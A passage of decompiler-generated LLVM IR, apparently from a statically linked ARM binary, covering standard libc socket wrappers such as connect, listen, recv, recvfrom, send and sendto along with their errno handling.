  %v1_115bc = phi i32 [ %v0_11590, %entry ], [ -1, %dec_label_pc_115a0 ]
  %v2_115b8 = phi i32 [ %v3_11584, %entry ], [ %v2_115b8.pre, %dec_label_pc_115a0 ]
  store i32 %v2_115b8, i32* @r7, align 4
  ret i32 %v1_115bc

; uselistorder directives
  uselistorder i32 %v0_11590, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_115b8, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_115c0:
  %v0_115c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_115c0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_115c0
  %v2_115c0 = load i32, i32* @sl, align 4
  %v8_115c0 = shl i32 %v2_115c0, %arg2
  %v9_115c0 = and i32 %v8_115c0, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_115c0, %bb
  %v4_115c4 = phi i32 [ %arg1, %dec_label_pc_115c0 ], [ %v9_115c0, %bb ]
  ret i32 %v4_115c4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_115c8 = load i32, i32* @r7, align 4
  store i32 %v3_115c8, i32* %stack_var_-8, align 4
  %v0_115d4 = load i32, i32* @r0, align 4
  store i32 %v0_115d4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_115d4, -4095
  br i1 %tmp, label %dec_label_pc_115fc, label %dec_label_pc_115e4

dec_label_pc_115e4:                               ; preds = %entry
  %v0_115e8 = call i32 @__aeabi_read_tp()
  %v3_115ec = load i16, i16* @global_var_21a48.352, align 2
  %v4_115ec = sext i16 %v3_115ec to i32
  store i32 %v4_115ec, i32* @r3, align 4
  %v0_115f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_115f0 = sub i32 0, %v0_115f0
  store i32 %v1_115f0, i32* %r2.global-to-local, align 4
  %v3_115f4 = add i32 %v4_115ec, %v0_115e8
  %v4_115f4 = inttoptr i32 %v3_115f4 to i32*
  store i32 %v1_115f0, i32* %v4_115f4, align 4
  %v2_115fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_115fc

dec_label_pc_115fc:                               ; preds = %entry, %dec_label_pc_115e4
  %v1_11600 = phi i32 [ %v0_115d4, %entry ], [ -1, %dec_label_pc_115e4 ]
  %v2_115fc = phi i32 [ %v3_115c8, %entry ], [ %v2_115fc.pre, %dec_label_pc_115e4 ]
  store i32 %v2_115fc, i32* @r7, align 4
  ret i32 %v1_11600

; uselistorder directives
  uselistorder i32 %v0_115d4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_115fc, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11604:
  %v0_11604 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11604, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11604
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11604, %bb
  %v10_11608 = phi i32 [ %arg1, %dec_label_pc_11604 ], [ 0, %bb ]
  ret i32 %v10_11608

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11610 = load i32, i32* @r4, align 4
  store i32 %v3_11610, i32* %stack_var_-20, align 4
  %v6_11610 = load i32, i32* @r5, align 4
  %v9_11610 = load i32, i32* @r6, align 4
  %v12_11610 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r3, align 4
  %v4_1161c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 12800) to i32*), align 4
  store i32 %v4_1161c, i32* @ip, align 4
  %v2_11620 = icmp eq i32 %v4_1161c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_11620, label %dec_label_pc_11638, label %entry.dec_label_pc_11644_crit_edge

entry.dec_label_pc_11644_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11644

dec_label_pc_11638:                               ; preds = %entry
  store i32 %v3_11610, i32* @r4, align 4
  store i32 %v9_11610, i32* @r6, align 4
  store i32 %v12_11610, i32* @r7, align 4
  %v0_11640 = call i32 @__sys_connect()
  br label %dec_label_pc_11644

dec_label_pc_11644:                               ; preds = %entry.dec_label_pc_11644_crit_edge, %dec_label_pc_11638
  %v0_11644 = call i32 @__libc_enable_asynccancel()
  %v0_11648 = load i32, i32* @r6, align 4
  store i32 %v0_11648, i32* @r1, align 4
  store i32 %v0_11644, i32* @r5, align 4
  %v0_11654 = load i32, i32* @r4, align 4
  store i32 %v0_11654, i32* @r0, align 4
  %v0_11658 = call i32 @__sys_connect()
  store i32 %v0_11658, i32* @r4, align 4
  %v0_11660 = load i32, i32* @r5, align 4
  %v1_11664 = call i32 @__libc_disable_asynccancel(i32 %v0_11660)
  %v0_11668 = load i32, i32* @r4, align 4
  %v2_11670 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11670, i32* @r4, align 4
  store i32 %v6_11610, i32* @r5, align 4
  store i32 %v9_11610, i32* @r6, align 4
  store i32 %v12_11610, i32* @r7, align 4
  ret i32 %v0_11668

; uselistorder directives
  uselistorder label %dec_label_pc_11644, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11680 = load i32, i32* @r7, align 4
  store i32 %v3_11680, i32* %stack_var_-8, align 4
  %v0_1168c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1168c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1168c, -4095
  br i1 %tmp, label %dec_label_pc_116b4, label %dec_label_pc_1169c

dec_label_pc_1169c:                               ; preds = %entry
  %v0_116a0 = call i32 @__aeabi_read_tp()
  %v3_116a4 = load i16, i16* @global_var_21a48.352, align 2
  %v4_116a4 = sext i16 %v3_116a4 to i32
  %v0_116a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_116a8 = sub i32 0, %v0_116a8
  store i32 %v1_116a8, i32* %r2.global-to-local, align 4
  %v3_116ac = add i32 %v4_116a4, %v0_116a0
  %v4_116ac = inttoptr i32 %v3_116ac to i32*
  store i32 %v1_116a8, i32* %v4_116ac, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_116b4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_116b4

dec_label_pc_116b4:                               ; preds = %entry, %dec_label_pc_1169c
  %v1_116b8 = phi i32 [ %v0_1168c, %entry ], [ -1, %dec_label_pc_1169c ]
  %v2_116b4 = phi i32 [ %v3_11680, %entry ], [ %v2_116b4.pre, %dec_label_pc_1169c ]
  store i32 %v2_116b4, i32* @r7, align 4
  ret i32 %v1_116b8

; uselistorder directives
  uselistorder i32 %v0_1168c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_116b4, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_116bc:
  %v0_116bc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_116bc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_116bc
  %v2_116bc = load i32, i32* @lr, align 4
  %v8_116bc = shl i32 %v2_116bc, %arg2
  %v9_116bc = and i32 %v8_116bc, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_116bc, %bb
  %v4_116c0 = phi i32 [ %arg1, %dec_label_pc_116bc ], [ %v9_116bc, %bb ]
  ret i32 %v4_116c0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_116c4 = load i32, i32* @r4, align 4
  store i32 %v3_116c4, i32* %stack_var_-12, align 4
  %v0_116d4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_116d4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_116d4, -4095
  br i1 %tmp, label %dec_label_pc_116fc, label %dec_label_pc_116e4

dec_label_pc_116e4:                               ; preds = %entry
  %v0_116e8 = call i32 @__aeabi_read_tp()
  %v3_116ec = load i16, i16* @global_var_21a48.352, align 2
  %v4_116ec = sext i16 %v3_116ec to i32
  %v0_116f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_116f0 = sub i32 0, %v0_116f0
  store i32 %v1_116f0, i32* %r2.global-to-local, align 4
  %v3_116f4 = add i32 %v4_116ec, %v0_116e8
  %v4_116f4 = inttoptr i32 %v3_116f4 to i32*
  store i32 %v1_116f0, i32* %v4_116f4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_116fc.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_116fc

dec_label_pc_116fc:                               ; preds = %entry, %dec_label_pc_116e4
  %v1_11700 = phi i32 [ %v0_116d4, %entry ], [ -1, %dec_label_pc_116e4 ]
  %v2_116fc = phi i32 [ %v3_116c4, %entry ], [ %v2_116fc.pre, %dec_label_pc_116e4 ]
  store i32 %v2_116fc, i32* @r4, align 4
  ret i32 %v1_11700

; uselistorder directives
  uselistorder i32 %v0_116d4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_116fc, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11704:
  %v0_11704 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11704, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11704
  %v2_11708 = load i32, i32* @r4, align 4
  %v8_11708 = ashr i32 %v2_11708, %arg3
  %v9_11708 = and i32 %v8_11708, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11704, %bb
  %v10_11708 = phi i32 [ %arg1, %dec_label_pc_11704 ], [ %v9_11708, %bb ]
  ret i32 %v10_11708

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1170c = load i32, i32* @r7, align 4
  store i32 %v3_1170c, i32* %stack_var_-8, align 4
  %v0_11718 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11718, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11718, -4095
  br i1 %tmp, label %dec_label_pc_11740, label %dec_label_pc_11728

dec_label_pc_11728:                               ; preds = %entry
  %v0_1172c = call i32 @__aeabi_read_tp()
  %v3_11730 = load i16, i16* @global_var_21a48.352, align 2
  %v4_11730 = sext i16 %v3_11730 to i32
  %v0_11734 = load i32, i32* %r2.global-to-local, align 4
  %v1_11734 = sub i32 0, %v0_11734
  store i32 %v1_11734, i32* %r2.global-to-local, align 4
  %v3_11738 = add i32 %v4_11730, %v0_1172c
  %v4_11738 = inttoptr i32 %v3_11738 to i32*
  store i32 %v1_11734, i32* %v4_11738, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11740.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11740

dec_label_pc_11740:                               ; preds = %entry, %dec_label_pc_11728
  %v1_11744 = phi i32 [ %v0_11718, %entry ], [ -1, %dec_label_pc_11728 ]
  %v2_11740 = phi i32 [ %v3_1170c, %entry ], [ %v2_11740.pre, %dec_label_pc_11728 ]
  store i32 %v2_11740, i32* @r7, align 4
  ret i32 %v1_11744

; uselistorder directives
  uselistorder i32 %v0_11718, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11740, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1174c = load i32, i32* @r7, align 4
  store i32 %v3_1174c, i32* %stack_var_-8, align 4
  %v0_11758 = load i32, i32* @r0, align 4
  store i32 %v0_11758, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11758, -4095
  br i1 %tmp, label %dec_label_pc_11780, label %dec_label_pc_11768

dec_label_pc_11768:                               ; preds = %entry
  %v0_1176c = call i32 @__aeabi_read_tp()
  %v3_11770 = load i16, i16* @global_var_21a48.352, align 2
  %v4_11770 = sext i16 %v3_11770 to i32
  %v0_11774 = load i32, i32* %r2.global-to-local, align 4
  %v1_11774 = sub i32 0, %v0_11774
  store i32 %v1_11774, i32* %r2.global-to-local, align 4
  %v3_11778 = add i32 %v4_11770, %v0_1176c
  %v4_11778 = inttoptr i32 %v3_11778 to i32*
  store i32 %v1_11774, i32* %v4_11778, align 4
  %v2_11780.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11780

dec_label_pc_11780:                               ; preds = %entry, %dec_label_pc_11768
  %v1_11784 = phi i32 [ %v0_11758, %entry ], [ -1, %dec_label_pc_11768 ]
  %v2_11780 = phi i32 [ %v3_1174c, %entry ], [ %v2_11780.pre, %dec_label_pc_11768 ]
  store i32 %v2_11780, i32* @r7, align 4
  ret i32 %v1_11784

; uselistorder directives
  uselistorder i32 %v0_11758, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11780, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i64* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11788:
  %v0_11788 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11788, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11788
  %v4_1178c = load i64, i64* %arg2, align 4
  %v7_1178c = udiv i64 %v4_1178c, 4294967296
  %v8_1178c = trunc i64 %v7_1178c to i32
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11788, %bb
  %v11_1178c = phi i32 [ %arg1, %dec_label_pc_11788 ], [ %v8_1178c, %bb ]
  ret i32 %v11_1178c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11794 = load i32, i32* @r4, align 4
  store i32 %v3_11794, i32* %stack_var_-24, align 4
  %v6_11794 = load i32, i32* @r5, align 4
  %v9_11794 = load i32, i32* @r6, align 4
  %v12_11794 = load i32, i32* @r7, align 4
  %v15_11794 = load i32, i32* @r8, align 4
  %v18_11794 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @ip, align 4
  %v4_117a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 12800) to i32*), align 4
  %v2_117a4 = icmp eq i32 %v4_117a0, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_117a4, label %dec_label_pc_117bc, label %entry.dec_label_pc_117c4_crit_edge

entry.dec_label_pc_117c4_crit_edge:               ; preds = %entry
  br label %dec_label_pc_117c4

dec_label_pc_117bc:                               ; preds = %entry
  store i32 %v3_11794, i32* @r4, align 4
  store i32 %v9_11794, i32* @r6, align 4
  store i32 %v12_11794, i32* @r7, align 4
  store i32 %v15_11794, i32* @r8, align 4
  %v0_117c0 = call i32 @__sys_recv()
  br label %dec_label_pc_117c4

dec_label_pc_117c4:                               ; preds = %entry.dec_label_pc_117c4_crit_edge, %dec_label_pc_117bc
  %v0_117c4 = call i32 @__libc_enable_asynccancel()
  %v0_117c8 = load i32, i32* @r6, align 4
  store i32 %v0_117c8, i32* @r1, align 4
  store i32 %v0_117c4, i32* @r5, align 4
  %v0_117d8 = load i32, i32* @r4, align 4
  store i32 %v0_117d8, i32* @r0, align 4
  %v0_117dc = call i32 @__sys_recv()
  store i32 %v0_117dc, i32* @r4, align 4
  %v0_117e4 = load i32, i32* @r5, align 4
  %v1_117e8 = call i32 @__libc_disable_asynccancel(i32 %v0_117e4)
  %v0_117ec = load i32, i32* @r4, align 4
  %v2_117f0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_117f0, i32* @r4, align 4
  store i32 %v6_11794, i32* @r5, align 4
  store i32 %v9_11794, i32* @r6, align 4
  store i32 %v12_11794, i32* @r7, align 4
  store i32 %v15_11794, i32* @r8, align 4
  store i32 %v18_11794, i32* @lr, align 4
  ret i32 %v0_117ec

; uselistorder directives
  uselistorder label %dec_label_pc_117c4, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11800 = load i32, i32* @r4, align 4
  store i32 %v3_11800, i32* %stack_var_-16, align 4
  %v0_11814 = load i32, i32* @r0, align 4
  store i32 %v0_11814, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11814, -4095
  br i1 %tmp, label %dec_label_pc_1183c, label %dec_label_pc_11824

dec_label_pc_11824:                               ; preds = %entry
  %v0_11828 = call i32 @__aeabi_read_tp()
  %v3_1182c = load i16, i16* @global_var_21a48.352, align 2
  %v4_1182c = sext i16 %v3_1182c to i32
  %v0_11830 = load i32, i32* %r2.global-to-local, align 4
  %v1_11830 = sub i32 0, %v0_11830
  store i32 %v1_11830, i32* %r2.global-to-local, align 4
  %v3_11834 = add i32 %v4_1182c, %v0_11828
  %v4_11834 = inttoptr i32 %v3_11834 to i32*
  store i32 %v1_11830, i32* %v4_11834, align 4
  %v2_1183c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_1183c

dec_label_pc_1183c:                               ; preds = %entry, %dec_label_pc_11824
  %v1_11840 = phi i32 [ %v0_11814, %entry ], [ -1, %dec_label_pc_11824 ]
  %v2_1183c = phi i32 [ %v3_11800, %entry ], [ %v2_1183c.pre, %dec_label_pc_11824 ]
  store i32 %v2_1183c, i32* @r4, align 4
  ret i32 %v1_11840

; uselistorder directives
  uselistorder i32 %v0_11814, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1183c, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11848 = load i32, i32* @r4, align 4
  store i32 %v3_11848, i32* %stack_var_-32, align 4
  %v6_11848 = load i32, i32* @r5, align 4
  %v9_11848 = load i32, i32* @r6, align 4
  %v12_11848 = load i32, i32* @r7, align 4
  %v15_11848 = load i32, i32* @r8, align 4
  %v18_11848 = load i32, i32* @sb, align 4
  %v21_11848 = load i32, i32* @sl, align 4
  %v24_11848 = load i32, i32* @lr, align 4
  %v4_11858 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 12800) to i32*), align 4
  %v2_11860 = icmp eq i32 %v4_11858, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_11860, label %dec_label_pc_11880, label %dec_label_pc_1188c

dec_label_pc_11880:                               ; preds = %entry
  store i32 %v3_11848, i32* @r4, align 4
  store i32 %v12_11848, i32* @r7, align 4
  store i32 %v15_11848, i32* @r8, align 4
  store i32 %v18_11848, i32* %sb.global-to-local, align 4
  %v0_11888 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_1188c

dec_label_pc_1188c:                               ; preds = %entry, %dec_label_pc_11880
  %v0_1188c = call i32 @__libc_enable_asynccancel()
  store i32 %v0_1188c, i32* @r5, align 4
  %v0_118a0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_118a0, i32* @r0, align 4
  %v0_118a8 = call i32 @__sys_recvfrom()
  store i32 %v0_118a8, i32* @r4, align 4
  %v0_118b0 = load i32, i32* @r5, align 4
  %v1_118b4 = call i32 @__libc_disable_asynccancel(i32 %v0_118b0)
  %v0_118b8 = load i32, i32* @r4, align 4
  %v2_118c0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_118c0, i32* @r4, align 4
  store i32 %v6_11848, i32* @r5, align 4
  store i32 %v9_11848, i32* @r6, align 4
  store i32 %v12_11848, i32* @r7, align 4
  store i32 %v15_11848, i32* @r8, align 4
  store i32 %v18_11848, i32* @sb, align 4
  store i32 %v21_11848, i32* @sl, align 4
  store i32 %v24_11848, i32* @lr, align 4
  ret i32 %v0_118b8

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1188c, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_118d0 = load i32, i32* @r7, align 4
  store i32 %v3_118d0, i32* %stack_var_-8, align 4
  %v0_118dc = load i32, i32* @r0, align 4
  store i32 %v0_118dc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_118dc, -4095
  br i1 %tmp, label %dec_label_pc_11904, label %dec_label_pc_118ec

dec_label_pc_118ec:                               ; preds = %entry
  %v0_118f0 = call i32 @__aeabi_read_tp()
  %v3_118f4 = load i16, i16* @global_var_21a48.352, align 2
  %v4_118f4 = sext i16 %v3_118f4 to i32
  store i32 %v4_118f4, i32* @r3, align 4
  %v0_118f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_118f8 = sub i32 0, %v0_118f8
  store i32 %v1_118f8, i32* %r2.global-to-local, align 4
  %v3_118fc = add i32 %v4_118f4, %v0_118f0
  %v4_118fc = inttoptr i32 %v3_118fc to i32*
  store i32 %v1_118f8, i32* %v4_118fc, align 4
  %v2_11904.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11904

dec_label_pc_11904:                               ; preds = %entry, %dec_label_pc_118ec
  %v1_11908 = phi i32 [ %v0_118dc, %entry ], [ -1, %dec_label_pc_118ec ]
  %v2_11904 = phi i32 [ %v3_118d0, %entry ], [ %v2_11904.pre, %dec_label_pc_118ec ]
  store i32 %v2_11904, i32* @r7, align 4
  ret i32 %v1_11908

; uselistorder directives
  uselistorder i32 %v0_118dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11904, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1190c:
  %v0_1190c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1190c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1190c
  %v2_11910 = load i32, i32* @ip, align 4
  %v5_11910 = sdiv i32 %v2_11910, 4
  %v6_11910 = and i32 %v5_11910, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1190c, %bb
  %v7_11910 = phi i32 [ %arg1, %dec_label_pc_1190c ], [ %v6_11910, %bb ]
  ret i32 %v7_11910

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11918 = load i32, i32* @r4, align 4
  store i32 %v3_11918, i32* %stack_var_-24, align 4
  %v6_11918 = load i32, i32* @r5, align 4
  %v9_11918 = load i32, i32* @r6, align 4
  %v12_11918 = load i32, i32* @r7, align 4
  %v15_11918 = load i32, i32* @r8, align 4
  %v18_11918 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @ip, align 4
  %v4_11924 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 12800) to i32*), align 4
  %v2_11928 = icmp eq i32 %v4_11924, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_11928, label %dec_label_pc_11940, label %entry.dec_label_pc_11948_crit_edge

entry.dec_label_pc_11948_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11948

dec_label_pc_11940:                               ; preds = %entry
  store i32 %v3_11918, i32* @r4, align 4
  store i32 %v9_11918, i32* @r6, align 4
  store i32 %v12_11918, i32* @r7, align 4
  store i32 %v15_11918, i32* @r8, align 4
  %v0_11944 = call i32 @__sys_send()
  br label %dec_label_pc_11948

dec_label_pc_11948:                               ; preds = %entry.dec_label_pc_11948_crit_edge, %dec_label_pc_11940
  %v0_11948 = call i32 @__libc_enable_asynccancel()
  %v0_1194c = load i32, i32* @r6, align 4
  store i32 %v0_1194c, i32* @r1, align 4
  store i32 %v0_11948, i32* @r5, align 4
  %v0_11958 = load i32, i32* @r8, align 4
  store i32 %v0_11958, i32* @r3, align 4
  %v0_1195c = load i32, i32* @r4, align 4
  store i32 %v0_1195c, i32* @r0, align 4
  %v0_11960 = call i32 @__sys_send()
  store i32 %v0_11960, i32* @r4, align 4
  %v0_11968 = load i32, i32* @r5, align 4
  %v1_1196c = call i32 @__libc_disable_asynccancel(i32 %v0_11968)
  %v0_11970 = load i32, i32* @r4, align 4
  %v2_11974 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11974, i32* @r4, align 4
  store i32 %v6_11918, i32* @r5, align 4
  store i32 %v9_11918, i32* @r6, align 4
  store i32 %v12_11918, i32* @r7, align 4
  store i32 %v15_11918, i32* @r8, align 4
  store i32 %v18_11918, i32* @lr, align 4
  ret i32 %v0_11970

; uselistorder directives
  uselistorder label %dec_label_pc_11948, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11984 = load i32, i32* @r4, align 4
  store i32 %v3_11984, i32* %stack_var_-16, align 4
  %v0_11998 = load i32, i32* @r0, align 4
  store i32 %v0_11998, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11998, -4095
  br i1 %tmp, label %dec_label_pc_119c0, label %dec_label_pc_119a8

dec_label_pc_119a8:                               ; preds = %entry
  %v0_119ac = call i32 @__aeabi_read_tp()
  %v3_119b0 = load i16, i16* @global_var_21a48.352, align 2
  %v4_119b0 = sext i16 %v3_119b0 to i32
  %v0_119b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_119b4 = sub i32 0, %v0_119b4
  store i32 %v1_119b4, i32* %r2.global-to-local, align 4
  %v3_119b8 = add i32 %v4_119b0, %v0_119ac
  %v4_119b8 = inttoptr i32 %v3_119b8 to i32*
  store i32 %v1_119b4, i32* %v4_119b8, align 4
  %v2_119c0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_119c0

dec_label_pc_119c0:                               ; preds = %entry, %dec_label_pc_119a8
  %v1_119c4 = phi i32 [ %v0_11998, %entry ], [ -1, %dec_label_pc_119a8 ]
  %v2_119c0 = phi i32 [ %v3_11984, %entry ], [ %v2_119c0.pre, %dec_label_pc_119a8 ]
  store i32 %v2_119c0, i32* @r4, align 4
  ret i32 %v1_119c4

; uselistorder directives
  uselistorder i32 %v0_11998, { 1, 0, 2 }
  uselistorder label %dec_label_pc_119c0, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_119c8:
  %v0_119c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_119c8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_119c8
  %v5_119c8 = udiv i32 %arg2, 4
  %v6_119c8 = and i32 %v5_119c8, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_119c8, %bb
  %v4_119cc = phi i32 [ %arg1, %dec_label_pc_119c8 ], [ %v6_119c8, %bb ]
  ret i32 %v4_119cc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_119d0 = load i32, i32* @r4, align 4
  store i32 %v3_119d0, i32* %stack_var_-32, align 4
  %v6_119d0 = load i32, i32* @r5, align 4
  %v9_119d0 = load i32, i32* @r6, align 4
  %v12_119d0 = load i32, i32* @r7, align 4
  %v15_119d0 = load i32, i32* @r8, align 4
  %v18_119d0 = load i32, i32* @sb, align 4
  %v21_119d0 = load i32, i32* @sl, align 4
